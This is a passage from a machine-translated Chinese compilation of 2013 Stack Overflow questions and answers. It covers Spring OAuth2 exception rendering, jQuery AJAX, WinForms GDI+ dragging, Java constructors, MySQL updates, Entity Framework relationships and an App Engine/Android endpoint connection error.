    public void handleHttpEntityResponse(HttpEntity<?> responseEntity,
            ServletWebRequest webRequest) throws Exception
    {
        if (responseEntity == null)
        {
            return;
        }
        HttpInputMessage inputMessage = createHttpInputMessage(webRequest);
        HttpOutputMessage outputMessage = createHttpOutputMessage(webRequest);
        logger.info("filtering headers only...");
        if (responseEntity instanceof ResponseEntity
                && outputMessage instanceof ServerHttpResponse)
        {
            ((ServerHttpResponse) outputMessage)
                    .setStatusCode(((ResponseEntity<?>) responseEntity)
                            .getStatusCode());
        }
        HttpHeaders entityHeaders = responseEntity.getHeaders();
        if (!entityHeaders.isEmpty())
        {
            outputMessage.getHeaders().putAll(entityHeaders);
        }
    }

    private HttpInputMessage createHttpInputMessage(NativeWebRequest webRequest)
            throws Exception
    {
        HttpServletRequest servletRequest = webRequest
                .getNativeRequest(HttpServletRequest.class);
        return new ServletServerHttpRequest(servletRequest);
    }

    private HttpOutputMessage createHttpOutputMessage(
            NativeWebRequest webRequest) throws Exception
    {
        HttpServletResponse servletResponse = (HttpServletResponse) webRequest
                .getNativeResponse();
        return new ServletServerHttpResponse(servletResponse);
    }
} 
```

Then you will have to reference it within your spring context

```
 <bean id="oauthAuthenticationEntryPoint" class="org.springframework.security.oauth2.provider.error.OAuth2AuthenticationEntryPoint">
        <property name="realmName" value="theRealm" />
<property name="exceptionRenderer" ref="headerOnlyExceptionRender" />
    </bean>

    <bean id="clientAuthenticationEntryPoint" class="org.springframework.security.oauth2.provider.error.OAuth2AuthenticationEntryPoint">
        <property name="realmName" value="theRealm/client" />
        <property name="typeName" value="Basic" />
<property name="exceptionRenderer" ref="headerOnlyExceptionRender" />
    </bean>

    <bean id="oauthAccessDeniedHandler" class="org.springframework.security.oauth2.provider.error.OAuth2AccessDeniedHandler">
<property name="exceptionRenderer" ref="headerOnlyExceptionRender" />
</bean>

    <bean id="headerOnlyExceptionRender" class="org.some.nice.code.HeaderOnlyOAuth2ExceptionRenderer"/> 
```

Hope it helps.

# javascript - 具有阿拉伯值的查询字符串

> ID：15110736
> 
> 赞同：0
> 
> 时间：2013-02-27T11:17:16.643
> 
> 标签：javascript, jquery, asp.net-mvc, dom-events

我需要从 Javascript 调用`queryString`带有阿拉伯文本的 asp.net 页面，但它在联机时显示错误，但在本地服务器上运行顺畅。

```
 $.ajax({
        url: "Empty/emptyGovt2.aspx",
        data: "arKeyword="+encodeURIComponent($("#txt_arKeywords").val(),
        success: function(data) {    
             diaL("Details Updated Successfully");                  

         },
          error: function(){
              diaL('Error Occurred');
          }
 }); 
```

**当阿拉伯语值较小时，它可以顺利运行。当阿拉伯语文本位于多行时，就会出现问题。**

错误是：

> 错误：函数（）{拨号（'发生错误'）; }

节目`$("#txt_arKeywords").val()`：

> تمثيلخادمالحرمينالشريفينبالمنطقةالتأكدمنتحقيقسيرالعدالةفيالمنطقةالعملعلىحفظالأمنوالإستقرارفيالمنطقةالعملعلىكافةالخدماتلمواطنيالمنطقةبالتعاونوالتنسيقمعالجهاتالحكوميةوالمشاركةفيمراحلالتخطيطلكافةالخدماتالتأكدمنكفاءةوفعاليةالخدماتالتيتقدملمواطنيالمنطقةوالعملعلىتحسينوتطويرتقديمتلك الخدمات تلقي شكاوي وإستدعاءات المواطنين والنظر في أمورهم والعمل على تلبية مطالبهم وحل مشاكلهم

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:24:06.310

由于它在您的本地机器上运行，因此该错误很可能与服务器配置有关，因此请检查您在线服务器上的默认编码配置并将其与您的本地服务器进行比较（最好将其设置为 utf-8） 另一种可能如果您的请求是 GET 而不是 POST，则问题是在发送 GET AJAX 请求时编码阿拉伯文本后 URI 太长，如果这些解决方案不起作用，请指定您面临的错误消息。

# jquery - 从返回的 jQuery.get() 数据中提取 HTML 标记内容

> ID：15110739
> 
> 赞同：0
> 
> 时间：2013-02-27T11:17:30.077
> 
> 标签：jquery, html, wordpress

jQuery代码：

```
jQuery.get(templateDir + "/file.php",function(data){
        var content = jQuery(data).filter('#content').text();
        console.log(content);
        jQuery("#id").hide().html(content).fadeIn(1000);
},"html"); 
```

html结构：

```
<p id="content">content here</p>
<p id="content2">another content here </p
etc.... 
```

我想要做的是获取`p#content`元素的内部文本/html。
我在网上找到了一些解决方案，但似乎没有任何效果。
我尝试`find()`并`filter()`按照大多数人的建议，但他们没有解决我的问题。

`jQuery(data).text()`顺便说一句。

那有什么办法呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:25:08.737

你可以尝试每个 jquery `$("#testp p[id='content']").each...`，检查这个[jsfiddle](http://jsfiddle.net/jjay225/T3AzF/10/) xtc，它有一个包装器元素和一个没有包装器的元素。

编辑：

好的，如果它作为字符串返回，这个例子不起作用，因为 html 字符串被分配给一个变量“testelement”，就像你上面的问题中的变量“content”一样？

编辑：代码编辑 2：

```
var testelement='<p id="notcontent">Hello</p><p id="content" >content hello</p>';
//old version--> $(testelement).each(function() 
$(testelement).find('p').each(function()   //new version
{

    if($(this).is("p") && this.id=='content')
    {
       alert($(this).text());
       alert($(this).html());
    }

}) 
```

# c# - GDI 图形对象上的鼠标 OnDrag 事件

> ID：15110740
> 
> 赞同：1
> 
> 时间：2013-02-27T11:17:31.293
> 
> 标签：c#, winforms, mouseevent, gdi+

我有一个关于鼠标事件的简单问题。

我有一个 WinForms 应用程序，我使用 GDI+ 图形对象来绘制简单的形状，一个圆形。

现在我要做的是用鼠标拖动这个形状。

所以当用户移动鼠标时，当仍然按下左键时，我想移动对象。

我的问题是如何检测用户是否仍在按下鼠标左键？我知道winforms中没有onDrag事件。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:40:46.557

检查这个非常简化的例子。它没有涵盖 GDI+ 绘图的许多方面，但让您了解如何在 winforms 中处理鼠标事件。

```
using System.Drawing;
using System.Windows.Forms;

namespace WindowsFormsExamples
{
    public partial class DragCircle : Form
    {

        private bool bDrawCircle;
        private int circleX;
        private int circleY;
        private int circleR = 50;

        public DragCircle()
        {
            InitializeComponent();
        }

        private void InvalidateCircleRect()
        {
            this.Invalidate(new Rectangle(circleX, circleY, circleR + 1, circleR + 1));
        }

        private void DragCircle_MouseDown(object sender, MouseEventArgs e)
        {
            circleX = e.X;
            circleY = e.Y;
            bDrawCircle = true;
            this.Capture = true;
            this.InvalidateCircleRect();
        }

        private void DragCircle_MouseUp(object sender, MouseEventArgs e)
        {
            bDrawCircle = false;
            this.Capture = false;
            this.InvalidateCircleRect();
        }

        private void DragCircle_MouseMove(object sender, MouseEventArgs e)
        {

            if (bDrawCircle)
            {
                this.InvalidateCircleRect(); //Invalidate region that was occupied by circle before move
                circleX = e.X;
                circleY = e.Y;
                this.InvalidateCircleRect(); //Add to invalidate region the rectangle that circle will occupy after move.
            }
        }

        private void DragCircle_Paint(object sender, PaintEventArgs e)
        {
            if (bDrawCircle)
            {
                e.Graphics.DrawEllipse(new Pen(Color.Red), circleX, circleY, circleR, circleR);
            }
        }

    }
} 
```

# java - 找不到符号 - 构造函数 JAVA

> ID：15110745
> 
> 赞同：0
> 
> 时间：2013-02-27T11:17:39.630
> 
> 标签：java, inheritance, abstract

我在尝试设置此类时遇到错误找不到符号 - 构造函数客户。

```
public class PersonalCustomer extends Customer
{   
    public PersonalCustomer(String accountNumber, Address address, Name name)
    {
        super(accountNumber, address);
        name = name;        
    }
} 
```

下面是类客户。

```
public abstract class Customer
{    
    private String accountNumber;
    private Address address;
    private int balance;
    private char customerType;

    public Customer(String accountNumber, Address address, char customerType)
    {
        accountNumber = "";
        address = address;
        balance = 0;
        customerType = ' ';
    } 
```

任何人都可以在我出错的地方提供帮助吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T11:19:27.157

`Customer`构造函数用三个参数声明：

```
public Customer(String accountNumber, Address address, char customerType) 
```

而来自子类的调用仅提供两个：

```
super(accountNumber, address); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T11:20:51.183

`super(accountNumber, address, CustomerType);`

Java 编译器试图找到`super()`带有 2 个参数的构造函数，但不幸的是它不存在。因错误而退出！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-27T11:21:19.417

注意`Customer`的构造函数签名，它有 3 个参数。

现在，您从`PersonalCustomer`仅提供 2 的构造函数调用它。

# javascript - 可以推荐哪个基于 JavaScript 的库来获得类似轮播的滑动体验？

> ID：15110746
> 
> 赞同：-2
> 
> 时间：2013-02-27T11:17:40.370
> 
> 标签：javascript, html, css, carousel, swipe

我想基于适用于 iOS、Android 和 WP8 的 JavaScript 为移动触摸设备创建类似轮播的滑动体验，它易于使用并满足我的所有要求。

到目前为止，我尝试了这些插件，但没有一个能真正说服我：

*   TouchSwipe（太复杂）
*   SwipeView（如果快速滑动会出现问题）
*   iScroll（不支持 WP8）

因此，我正在寻找一个可以满足这些要求的好的 JS 库：

*   必须能够滑动所有类型的内容，而不仅仅是图像。例如，我希望能够向它传递一个`<div>`元素数组，并且插件应该处理它们并使它们水平滑动。
*   该插件**必须**适用于 iOS 4.x+、Android 2.2+ 和 Windows Phone 8。
*   它应该尽可能小（以千字节计）和轻量级。
*   它应该是性能优化的。例如，如果我传递了 20 个包含大量内部内容的 div 元素，则库应该足够聪明，可以隐藏不可见的项目并只滑动重要的 div（可见的那些）。
*   滑动应该是平滑的，如果用户释放屏幕，滑动的元素应该捕捉到父元素的边框，这样一次只能看到 1 个元素。

有没有可以推荐的图书馆？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:22:25.100

看看您的要求，我可以推荐 Hammer.js，我已经在一些类似的项目中使用过它，而且它小巧而美观，仅缩小了 3kb 左右。它很容易根据您的确切要求进行扩展和修改，因为我认为现成的任何东西都不能完全满足您的需求。

[http://eightmedia.github.com/hammer.js/](http://eightmedia.github.com/hammer.js/)

还可以根据经验快速记录一下使用默认设置来获得您想要的正确灵敏度和运动范围。

# javascript - 在ajax函数中使用变量（javascript）

> ID：15110750
> 
> 赞同：-1
> 
> 时间：2013-02-27T11:17:45.630
> 
> 标签：javascript, html, xml, jquery, web

我有一个 ajax 函数，它从服务器上的 xml 文件中检索数据。我正在尝试获取仅在您位于特定区域内时出现的文件（因此使用经度和纬度）。为此，我需要在 URL（在 ajax 函数中）中附加经度和纬度，以便我可以访问该文件。我在 ajax 函数之外声明了 2 个全局变量，分别保存经度和纬度。但我不知道如何在 ajax 函数中调用变量（以便我可以附加到 url 以检索文件）。谁能告诉我该怎么做？请给我一些例子。

谢谢

这是代码：（我没有输入我的确切网址）

```
 var geolocation = {};
    geolocation.latitude = 0;
    geolocation.longitude = 0;
    //Check if geolocation is available
    if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function (p) {
    geolocation.latitude = p.coords.latitude;
    geolocation.longitude = p.coords.longitude;
    alert(geolocation.latitude + " " + geolocation.longitude);
    }, function (error) {
    alert("Failed to get GPS location");
    });
    } else {
    alert("Failed to get GPS working");
    }
    $(document).ready(function () {
       $.ajax({
       type: "GET",
       url: "url",
       dataType: "xml",
       success: xmlParser
    });
    });
    function xmlParser(xml) {
       $('#wrap2').append("<ul></ul>");
       $(xml).find("photo").each(function () {
       var festname = $(this).find('name').text();
       var fest_url = $(this).find('url').text();
       var fest_filename = $(this).find('filename').text();
       $("<li></li>").html(festname + "" + fest_url + "" + fest_filename).appendTo("#wrap2 ul");
     });
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:20:39.047

如果变量是真正的全局变量（我强烈建议避免），那么您可以从任何地方访问它们。这就是“全球”一词的含义。

所以：

```
$.ajax({
    url:   "/path/to/the/file?foo=" + encodeURIComponent(fooGlobal) + "&bar=" & encodeURIComponent(barGlobal),
    // ...
}); 
```

...或类似的。您还可以让 jQuery 编码并为您附加它们（我假设这是一个`GET`操作）：

```
$.ajax({
    url:   "/path/to/the/file",
    data:  {
        foo:  fooGlobal,
        bar:  barGlobal
    },
    // ...
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:24:30.477

三种方式：既然你已经创建了（邪恶的）全局变量，你可以从一个函数中引用它们（JS 进行范围扫描）：

```
var globalVar = 1234;
function someFunction()
{
    console.log(globalVar);
} 
```

这行得通，没问题。如果你有一个在函数中声明的变量，它与全局变量同名，那么你也可以指定`window`, 作为命名空间：

```
var someVar = 'global';
function someFunction()
{
    var someVar = 'function scope';
    console.log(window.someVar);//logs global
    console.log(someVar);//logs function scope
} 
```

最后，坦率地说，这是将数据作为参数传递给函数，无论何时调用它：

```
function myFunction (long, lat)
{
     console.log('do stuff with ' + long + ' & ' + lat);
}
myFunction(123, 456);//logs do stuff with 123 & 456 
```

# mysql - MySQL - 如何查找和替换多个表

> ID：15110751
> 
> 赞同：0
> 
> 时间：2013-02-27T11:17:47.003
> 
> 标签：mysql, replace

我继承了一个混乱的数据库，其中有 4 个表，每个表都有一个名为关键字的字段。关键字字段包含如下字符串：

```
Row 1 -> 'blue,car,sunny,green,day'
Row 2 -> 'some,cool,keywords,green,nice'
Row 3 -> 'red,truck,fast,happy' 
```

等等...

我希望能够同时在多个表中进行查找和替换。比如，找到字符串'green'的所有实例并将其替换为字符串''

我试过了：

```
UPDATE table_name1, table_name2, table_name3, table_name4 SET keywords = replace(keywords, 'green', ''); 
```

但错误说`"Column 'keywords' in field list is ambiguous"`，我明白为什么会这样说（因为关键字列出现在两个表中..）

**如何在单个语句中引用所有 4 个表？**

我不想把更新语句放在一个循环中......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:48:59.187

表必须连接。[http://dev.mysql.com/doc/refman/5.5/en/update.html](http://dev.mysql.com/doc/refman/5.5/en/update.html) 然后将关键字引用为 table_name1.keywords、table_name2.keywords 等。

# c# - 无法确定 etxiDataModel 关系的主体端。多个添加的实体可能具有相同的主键

> ID：15110757
> 
> 赞同：4
> 
> 时间：2013-02-27T11:18:05.723
> 
> 标签：c#, entity-framework, entity-framework-5

![SettlementShift 的映射定义](../Images/4b12bfc894cf8579b2e3c767c8bbbc3f.png)我一直在努力解决这个问题一段时间，但无法解决这个问题。阅读了多篇文章并尝试了几种不同的解决方案，但没有任何效果。现在我觉得我已经停下来了，真的需要帮助。

我将 EF 5+ 与 DB first 和 edmx 文件一起使用。我的数据库中有 3 个不同的表：1\. 结算 2\. 成本 3\. 班次

Settlement 在我的 edmx 文件中包含由 Association 连接的 Cost 和 Shift（带有链接表）的集合。

![我的数据库中带有链接表的结算表](../Images/82fae96eaa3d624e811dc0bd0a63a497.png) 我需要在我的数据库中插入一个新的 Settlement，并引用已经存在的 Cost 和 Shift 集合。我试图插入的结算实体中包含的班次和成本包含所有相关数据，并且没有以任何方式修改这些数据（与我从数据库中检索到的相同）。在我将实体插入我的数据库的方法中。

```
public bool CreateSettlement(Settlement settlement)
    {
        bool _success;

        var _context = new EtaxiEnteties();// ObjectFactory.Get<IETaxiEntitiesContext>();

            try
            {
                var _newSettlement = new Settlement
                                         {
                                             CreateDate = settlement.CreateDate,
                                             Driver = settlement.Driver,
                                             DriverID = settlement.DriverID,
                                             Car = settlement.Car,
                                             CarID = settlement.CarID,
                                             DocPath = settlement.DocPath
                                         };
                foreach (var _shift in settlement.Shifts)
                {
                    //var _sh = _context.Shifts.Find(_shift.ShiftID);
                    //_context.Entry(_sh).CurrentValues.SetValues(_shift);
                    _newSettlement.Shifts.Add(_shift);
                }

                foreach (var _cost in settlement.Costs)
                {
                    ////var _sh = _context.Costs.Find(_cost.CostID);
                    ////_context.Entry(_sh).CurrentValues.SetValues(_cost);
                    _newSettlement.Costs.Add(_cost);
                }
                _context.Settlements.Add(_newSettlement);

                _success = _context.SaveChanges() > 0;
            }
            catch (Exception ex)
            {
                throw new Exception(ex.Message);
            }
        return _success;
    } 
```

对此问题的任何帮助将不胜感激。

以下是我如何将 Cost 和 Shift 添加到我的收藏：

我在页面中创建了一个结算：

```
_settlement = new Settlement
                            {
                                CreateDate = DateTime.Now,
                                Driver = _driver,
                                DriverID = _driver.DriverID,
                                Car = _car,
                                CarID = _car.CarID,
                                DocPath = _path
                            }; 
```

然后当我从 2 个分离的网格视图中创建一个包含选定行的 pdf 文件时：

```
 foreach (GridDataItem _selectedRow in gwShifts.MasterTableView.Items)
            {
                if (_selectedRow.Selected)
                {
                    var _shift =
                        _diaryRepository.GetShiftByID((int) _selectedRow.GetDataKeyValue("ShiftID")).FirstOrDefault();

                    if (_shift != null)
                    {
                        _settlement.Shifts.Add(_shift);
                        _settlementData.Shifts.Add(_shift);
                        _settlementData.SplitPercentace = GetTemplateValue(_selectedRow, "lblSplit");
                        _settlementData.SettlementAmount = GetTemplateValue(_selectedRow, "lblSettlementAmount");

                        if (_settlementData.Shifts != null)
                        {
                            _tableShifts.AddCell(
                                new PdfPCell(
                                    new Phrase(
                                        _settlementData.Shifts.FirstOrDefault().ShiftDate.ToShortDateString(),
                                        _bodyFont)) {Border = 0});
                            _tableShifts.AddCell(
                                new PdfPCell(
                                    new Phrase(
                                        string.Format("{0:c}", _settlementData.Shifts.FirstOrDefault().GrossAmount),
                                        _bodyFont)) {Border = 0});
                            _tableShifts.AddCell(
                                new PdfPCell(
                                    new Phrase(
                                        string.Format("{0:c}", _settlementData.Shifts.FirstOrDefault().MoneyAmount),
                                        _bodyFont)) {Border = 0});
                            _tableShifts.AddCell(new PdfPCell(new Phrase(_settlementData.SplitPercentace, _bodyFont))
                                                     {Border = 0});
                            _tableShifts.AddCell(
                                new PdfPCell(new Phrase(_settlementData.SettlementAmount, _boldTableFont))
                                    {Border = 0});

                            _totalAmount.AddRange(new[]
                                                      {
                                                          Convert.ToInt32(
                                                              _settlementData.SettlementAmount.Replace(".", "").
                                                                  Replace(",", "").Replace("kr", ""))
                                                      });
                            _settlementData.Shifts.Remove(_shift);
                        }
                    }
                }
            }

            var _summaryCell =
                new PdfPCell(new Phrase("Upphæð: " + string.Format("{0:c}", _totalAmount.Sum()), _boldTableFont))
                    {
                        Border = 0,
                        Colspan = 5,
                        HorizontalAlignment = Element.ALIGN_RIGHT,
                        Padding = 5,
                        BorderWidthTop = 1
                    };
            _tableShifts.AddCell(_summaryCell);

            if (_totalAmount.Count != 0)
                _totalAmount.Clear();
        } 
```

在那里你看到我如何将 Shift 添加到这个 Settlement 实体：

```
 var _shift =
                        _diaryRepository.GetShiftByID((int) _selectedRow.GetDataKeyValue("ShiftID")).FirstOrDefault();

                    if (_shift != null)
                    {
                        _settlement.Shifts.Add(_shift); 
```

然后我把它发送到repository（见上面的方法）

```
 if(_driverRepository.CreateSettlement(_settlement))
            {
                SetMessage("Uppgjör hefur verið skapað og sent bílstjóra ef e-póstur er skráður á viðkomandi bílstjóra.", "Uppgjör skapað");
                pnlSettlement.Visible = false;
                pnlDocCreation.Visible = false;
                pnlResult.Visible = false;   
            } 
```

我还尝试简单地将参数结算直接添加到上下文中，但遇到了类似的错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T14:18:59.043

我认为这与您填充`Shifts`and`Costs`集合的方式有关。您正在尝试添加已创建的记录（即它们已经设置了主键值）以与新`Settlement`实体一起保存，但我相信实体框架不会尝试创建链接到新`Settlement`实体的新记录，而是而是将它们按原样保存到表中。在这种情况下，您确实会遇到多个实体具有相同主键的情况。

我会尝试以下方法（我将仅向您展示使用`Shifts`循环，但您也应该能够将其应用于`Costs`循环）：

```
foreach (var _shift in settlement.Shifts)
{
  var newShift = new Shift { /*Copy all of the values from _shift here*/ };
  _newSettlement.Shifts.Add(_shift);
  context.Shifts.Add(newShift);
} 
```

如果这不起作用，我建议调试`Costs`并`Shifts`确保您在这些集合中没有任何重复项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T15:20:45.757

如果您不想要新的`Shifts`，`Costs`那么我只能假设您需要将现有的重新指向新的`Settlement`

```
foreach (var shift in settlement.Shifts)
{  
    //either
    shift.Settlement = newSettlement;
    //or
    shift.SettlementId = newSettlement.SettlementId;
    //depending on your object model
} 
```

* * *

我刚刚意识到我误解了这个问题。图中未显示 2 个附加表（成本和班次）。问题是试图创建将 Settlement 连接`SettlementCost`到.`SettlementShift``Costs\Shifts`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T21:25:43.087

好的，对此提出了一个“丑陋”的解决方案..但它已经解决了。将模型更改为一个（结算）-> 多个（班次或成本）关系。

我创建了一个新的 Settlement 并将其保存到 DB。从每个数据库更新 SettlementID 中检索每个班次和成本，并将它们保存到数据库。

```
 try
        {
            var _newSettlement = new Settlement
                                        {
                                            CreateDate = settlement.CreateDate,
                                            DriverID = settlement.DriverID,
                                            CarID = settlement.CarID,
                                            DocPath = settlement.DocPath
                                        };
            Add(_newSettlement);
            _success = SaveWithSuccess() > 0;

            var _settlement = GetAll().FirstOrDefault(x => x.SettlementID == _newSettlement.SettlementID);

            if (_success)
            {
                foreach (var _shift in settlement.Shifts)
                {
                    var _sh = _diaryRepository.GetShiftByID(_shift.ShiftID).FirstOrDefault();
                    _sh.SettlementID = _settlement.SettlementID;
                    _diaryRepository.UpdateShift(_sh);
                }

                foreach (var _cost in settlement.Costs)
                {
                    var _ch = _costRepository.GetCostByID(_cost.CostID);
                    _ch.SettlementID = _settlement.SettlementID;
                    _costRepository.UpdateCost(_ch);

                }
            }
        } 
```

不是一个漂亮的，但它解决了这个问题。我不关心数据库请求负载..在这种情况下不会那么高。

我认为有一个更好的解决方案，但我目前无法找到它。

感谢您为帮助所做的所有努力:)

# java - App Engine 已连接 Android 项目：端点服务器失败

> ID：15110761
> 
> 赞同：3
> 
> 时间：2013-02-27T11:18:20.830
> 
> 标签：java, android, google-app-engine

我是 Android 编程的新手，我正在尝试执行一个将图像发送到返回结果的服务器的应用程序。出于这个原因，我正在关注App Engine Connected Android 上的谷歌教程[2 。](https://developers.google.com/eclipse/docs/endpoints-androidconnected-gae)运行应用程序的电话端时出现问题，因为模拟器没有启动，如果我用真实设备尝试它，它会说“使用端点注册失败”，结果的屏幕截图在链接[1](http://i.stack.imgur.com/230G2.png)中.

我已将 LOCAL_ANDROID_RUN 设置为 true，并且还插入了相应的项目编号和 api_keys。不知道怎么回事，控制台和logcat输出如下：

运行 -AppEngine 控制台：

```
feb. 27, 2013 11:36:51 AM com.google.apphosting.utils.config.EarHelper logNotAnEar
INFO: Directory '/Users/JL/Documents/workspace/p27_2-AppEngine/war' is not an EAR directory. File /Users/JL/Documents/workspace/p27_2-AppEngine/war/appengine-application.xmlappengine-application.xml not detected.
feb. 27, 2013 11:36:51 AM com.google.apphosting.utils.config.EarHelper logNotAnEar
INFO: Directory '/Users/JL/Documents/workspace/p27_2-AppEngine/war' is not an EAR directory. File /Users/JL/Documents/workspace/p27_2-AppEngine/war/appengine-application.xmlappengine-application.xml not detected.
feb. 27, 2013 11:36:51 AM com.google.apphosting.utils.config.EarHelper logNotAnEar
INFO: Directory '/Users/JL/Documents/workspace/p27_2-AppEngine/war' is not an EAR directory. File /Users/JL/Documents/workspace/p27_2-AppEngine/war/appengine-application.xmlappengine-application.xml not detected.
feb. 27, 2013 11:36:51 AM com.google.apphosting.utils.config.EarHelper logNotAnEar
INFO: Directory '/Users/JL/Documents/workspace/p27_2-AppEngine/war' is not an EAR directory. File /Users/JL/Documents/workspace/p27_2-AppEngine/war/appengine-application.xmlappengine-application.xml not detected.
feb. 27, 2013 11:36:51 AM com.google.apphosting.utils.config.AppEngineWebXmlReader readAppEngineWebXml
INFO: Successfully processed /Users/JL/Documents/workspace/p27_2-AppEngine/war/WEB-INF/appengine-web.xml
feb. 27, 2013 11:36:51 AM com.google.apphosting.utils.config.AbstractConfigXmlReader readConfigXml
INFO: Successfully processed /Users/JL/Documents/workspace/p27_2-AppEngine/war/WEB-INF/web.xml
feb. 27, 2013 11:36:51 AM com.google.appengine.tools.development.SystemPropertiesManager setSystemProperties
INFO: Overwriting system property key 'java.util.logging.config.file', value '/Applications/eclipse/plugins/com.google.appengine.eclipse.sdkbundle_1.7.5/appengine-java-sdk-1.7.5/config/sdk/logging.properties' with value 'WEB-INF/logging.properties' from '/Users/JL/Documents/workspace/p27_2-AppEngine/war/WEB-INF/appengine-web.xml'
java.net.BindException: Address already in use
    at sun.nio.ch.Net.bind0(Native Method)
    at sun.nio.ch.Net.bind(Net.java:344)
    at sun.nio.ch.Net.bind(Net.java:336)
    at sun.nio.ch.ServerSocketChannelImpl.bind(ServerSocketChannelImpl.java:199)
    at sun.nio.ch.ServerSocketAdaptor.bind(ServerSocketAdaptor.java:74)
    at org.mortbay.jetty.nio.SelectChannelConnector.open(SelectChannelConnector.java:216)
    at com.google.appengine.tools.development.JettyContainerService.connectContainer(JettyContainerService.java:189)
    at com.google.appengine.tools.development.AbstractContainerService.createConnection(AbstractContainerService.java:243)
    at com.google.appengine.tools.development.AbstractServer.createConnection(AbstractServer.java:71)
    at com.google.appengine.tools.development.DevAppServerImpl$Servers.createConnections(DevAppServerImpl.java:445)
    at com.google.appengine.tools.development.DevAppServerImpl.start(DevAppServerImpl.java:181)
    at com.google.appengine.tools.development.DevAppServerMain$StartAction.apply(DevAppServerMain.java:333)
    at com.google.appengine.tools.util.Parser$ParseResult.applyArgs(Parser.java:48)
    at com.google.appengine.tools.development.DevAppServerMain.<init>(DevAppServerMain.java:269)
    at com.google.appengine.tools.development.DevAppServerMain.main(DevAppServerMain.java:245) 
```

在真实设备控制台上运行手机端：

```
[2013-02-27 11:31:53 - p27_2] ------------------------------
[2013-02-27 11:31:53 - p27_2] Android Launch!
[2013-02-27 11:31:53 - p27_2] adb is running normally.
[2013-02-27 11:31:53 - p27_2] Performing com.p27_2.MainActivity activity launch
[2013-02-27 11:31:56 - p27_2] Application already deployed. No need to reinstall.
[2013-02-27 11:31:56 - p27_2] Starting activity com.p27_2.MainActivity on device 31315808870300EC
[2013-02-27 11:31:56 - p27_2] ActivityManager: Starting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=com.p27_2/.MainActivity }
[2013-02-27 11:31:56 - p27_2] ActivityManager: Warning: Activity not started, its current task has been brought to the front
[2013-02-27 11:35:21 - p27_2] ------------------------------
[2013-02-27 11:35:21 - p27_2] Android Launch!
[2013-02-27 11:35:21 - p27_2] adb is running normally.
[2013-02-27 11:35:21 - p27_2] Performing com.p27_2.MainActivity activity launch
[2013-02-27 11:35:24 - p27_2] Application already deployed. No need to reinstall.
[2013-02-27 11:35:24 - p27_2] Starting activity com.p27_2.MainActivity on device 31315808870300EC
[2013-02-27 11:35:24 - p27_2] ActivityManager: Starting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=com.p27_2/.MainActivity }
[2013-02-27 11:35:24 - p27_2] ActivityManager: Warning: Activity not started, its current task has been brought to the front
[2013-02-27 11:37:06 - p27_2] ------------------------------
[2013-02-27 11:37:06 - p27_2] Android Launch!
[2013-02-27 11:37:06 - p27_2] adb is running normally.
[2013-02-27 11:37:06 - p27_2] Performing com.p27_2.MainActivity activity launch
[2013-02-27 11:37:09 - p27_2] Application already deployed. No need to reinstall.
[2013-02-27 11:37:09 - p27_2] Starting activity com.p27_2.MainActivity on device 31315808870300EC
[2013-02-27 11:37:10 - p27_2] ActivityManager: Starting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=com.p27_2/.MainActivity }
[2013-02-27 11:37:10 - p27_2] ActivityManager: Warning: Activity not started, its current task has been brought to the front 
```

日志猫：

```
02-27 11:36:58.968: D/GCMRegistrar(1684): resetting backoff for com.p27_2
02-27 11:36:58.968: V/GCMRegistrar(1684): Registering app com.p27_2 of senders 658829472559
02-27 11:36:59.296: V/GCMBroadcastReceiver(1684): onReceive: com.google.android.c2dm.intent.REGISTRATION
02-27 11:36:59.296: V/GCMBroadcastReceiver(1684): GCM IntentService class: com.p27_2.GCMIntentService
02-27 11:36:59.296: V/GCMBaseIntentService(1684): Acquiring wakelock
02-27 11:36:59.316: W/AbstractGoogleClient(1684): Application name is not set. Call Builder#setApplicationName.
02-27 11:36:59.328: D/GCMBaseIntentService(1684): handleRegistration: registrationId = APA91bEN9AXnKP8jsVmt3fNj1ziAegl04m4laECFqkzFxbuk2dfdvK3ePCVH_3JOjKehC0EpPgkkIp8t-OJtxTe_E12lw9atzEcHVpsyr_Qdi4UYxQgsW2w3uZQRnbj8Aho_IUjAWKub, error = null, unregistered = null
02-27 11:36:59.328: D/GCMRegistrar(1684): resetting backoff for com.p27_2
02-27 11:36:59.335: V/GCMRegistrar(1684): Saving regId on app version 1
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684): Exception received when attempting to register with server at http://10.0.2.2:8888/_ah/api/
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684): java.net.SocketTimeoutException: failed to connect to /10.0.2.2 (port 8888) after 20000ms
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.io.IoBridge.connectErrno(IoBridge.java:159)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.io.IoBridge.connect(IoBridge.java:112)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:192)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:459)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at java.net.Socket.connect(Socket.java:842)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpConnection.<init>(HttpConnection.java:76)
02-27 11:37:39.511: E/com.p27_2.GCMIntentService(1684):     at libcore.net.http.HttpConnection.<init>(HttpConnection.java:50)
